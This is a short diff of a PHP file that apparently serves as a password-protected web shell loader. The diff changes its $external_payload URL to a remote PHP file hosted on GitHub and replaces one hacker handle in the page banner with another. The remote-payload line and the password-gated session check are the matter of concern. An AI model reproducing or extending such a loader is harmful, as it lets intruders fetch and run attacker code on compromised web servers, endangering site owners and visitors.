@@ -5,7 +5,7 @@ session_start();
  * KONFIGURASI
  */
 $valid_password_hash = 'dc2f4ef676263fe9dde73a9ae6299258'; 
-$external_payload = 'https://7dewa.pages.dev/ah.txt';
+$external_payload = 'https://raw.githubusercontent.com/Arya133/PHP/refs/heads/main/emeraldv2.php';
 $logo_url = 'https://g.top4top.io/p_36674k04q0.png';
 
 /**
@@ -184,7 +184,7 @@ if (isset($_SESSION['X-H0UR'])) {
     </div>
     
     <div>
-        <span class="mr-q-text">Mr.Q</span>
+        <span class="mr-q-text">Tn_Wizyakuza404</span>
     </div>
 
     <div class="header">
